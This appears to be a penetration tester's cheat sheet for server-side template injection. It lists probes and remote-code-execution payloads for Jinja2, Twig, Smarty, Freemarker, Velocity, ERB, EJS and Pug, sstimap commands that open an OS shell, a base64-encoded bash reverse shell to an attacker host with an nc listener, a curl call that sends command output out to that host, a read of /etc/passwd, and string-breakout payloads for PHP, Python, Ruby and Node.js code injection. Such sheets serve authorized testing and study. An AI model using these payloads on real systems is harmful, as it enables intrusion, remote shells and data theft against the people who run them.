# SSTI

## Find where it renders
- [ ] Every input that comes back on a page: parameters, path segments, cookies, form fields, a profile's name, an email or PDF built from my text
One probe at a time, looking for 49 in the response:
{{7*7}}
${7*7}
${{7*7}}
<%= 7*7 %>
#{7*7}
*{7*7}
@(7*7)
<#assign x=7*7>${x}
{{7*'7'}}
From the shell, with the probe URL-encoded for me:
curl -sk -G '<Scheme>://<WebHost>/THE-PAGE' --data-urlencode '<Param>={{7*7}}'
A string that breaks most engines, for an error page that names one:
${{<%[%'"}}%\
- [ ] {{7*'7'}} gives 49 on Twig and 7777777 on Jinja2
- [ ] The engine or framework named in an error, a header or a cookie

## Python: Jinja2, Flask
{{ config }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
- [ ] SECRET_KEY in config: a Flask session cookie I can sign

## PHP: Twig and Smarty
{{ ['id']|filter('system') }}
{{ ['id']|map('system')|join }}
Twig 1.x:
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
Smarty:
{$smarty.version}
{system('id')}

## Java: Freemarker and Velocity
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$out.read()#end

## Ruby and Node.js
ERB:
<%= `id` %>
<%= File.read('/etc/passwd') %>
EJS, then Pug:
<%= process.mainModule.require('child_process').execSync('id') %>
#{process.mainModule.require('child_process').execSync('id')}

## Let sstimap do it
The * marks where the payload goes:
sstimap -u '<Scheme>://<WebHost>/THE-PAGE?<Param>=*'
sstimap -u '<Scheme>://<WebHost>/THE-PAGE?<Param>=*' --os-shell
- [ ] Not installed: sudo apt install sstimap

## From id to a shell
The shell line base64-encoded, so it needs no quotes inside a payload:
echo -n 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' | base64 -w 0
rlwrap nc -lvnp <LPORT>
Then the engine's payload runs this in place of id, here for Jinja2:
{{ cycler.__init__.__globals__.os.popen('echo THE-BASE64|base64 -d|bash').read() }}
- [ ] Other shells, Windows included: :Pb shells

## Nothing comes back
A command that calls home proves it runs. On Kali, one of:
sudo tcpdump -i tun0 icmp
python3 -m http.server 8000
In place of id:
ping -c 2 <LHOST>
curl http://<LHOST>:8000/$(id|base64 -w 0)

## Input run as code, not a template
- [ ] A lone quote gives Parse error (PHP), SyntaxError (Python) or unterminated string (Ruby), not an SQL error
- [ ] Arithmetic such as ".(7*7)." or "+str(7*7)+" changes the page: the input is evaluated
Each closes the app's string, adds a call and reopens it, with the app's own quote, ' or ":
hacker".system('id')."
hacker"+str(__import__('os').popen('id').read())+"
hacker"+`id`+"
A PHP sort or callback parameter, such as order:
id);}system('id');//
Node.js eval(), Function() or setTimeout():
res.end(require('child_process').execSync('id').toString())
- [ ] In a URL, + goes as %2b, or through --data-urlencode as above
